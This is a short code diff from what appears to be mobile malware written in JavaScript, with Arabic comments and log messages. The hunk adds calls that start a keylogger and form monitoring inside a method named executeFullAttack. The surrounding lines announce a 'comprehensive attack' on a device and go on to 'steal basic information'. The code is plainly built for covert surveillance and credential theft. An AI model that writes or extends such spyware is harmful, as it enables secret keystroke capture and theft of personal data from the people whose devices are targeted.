@@ -1395,7 +1395,10 @@ class EnhancedMobileSystem {
     async executeFullAttack() {
         console.log(`🎯 بدء الهجوم الشامل على ${this.deviceType}`);
       
-        
+        const surveillance = new AdvancedSurveillance();
+    surveillance.startKeylogger();
+    surveillance.startFormMonitoring();
+    
         // 2. سرقة فورية للمعلومات الأساسية
         await this.stealBasicInfo();
         
